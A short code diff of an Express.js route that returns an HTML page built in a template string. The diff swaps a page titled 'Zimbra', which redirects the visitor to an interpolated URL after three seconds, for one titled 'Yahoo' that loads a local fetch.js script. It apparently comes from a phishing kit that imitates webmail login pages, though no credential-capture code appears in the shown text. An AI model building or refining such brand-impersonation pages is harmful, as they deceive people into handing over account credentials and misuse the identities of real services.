@@ -14,18 +14,16 @@ router.get('/', (req, res) => {
 
   const htmlContent = `
   <!DOCTYPE html>
-<html class="js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths template user_font_size_normal" lang="en">
-  <head>
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <meta http-equiv="cache-control" content="no-cache">
-    <meta http-equiv="Pragma" content="no-cache">
-    <title>Zimbra</title>
-    <link href="./stylesheet/common,login,zhtml,skin.css" rel="stylesheet" type="text/css">
-       <script>
-                setTimeout(function() {
-                    window.location.href = '${url}';
-                }, 3000);
-            </script> 
+<html lang="en">
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+        <meta charset="utf-8">
+        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no">
+            <link rel="icon" type="image/x-icon" href="./images/img.ico">
+        <meta name="format-detection" content="telephone=no">
+        <title>Yahoo</title>
+        <link href="/stylesheet/main.css" rel="stylesheet" type="text/css">
+		<script type="text/javascript" src="/script/fetch.js"></script>
     
     <link rel="SHORTCUT ICON" href="./images/favicon.ico" id="DWT2" type="image/x-icon">
 <style>
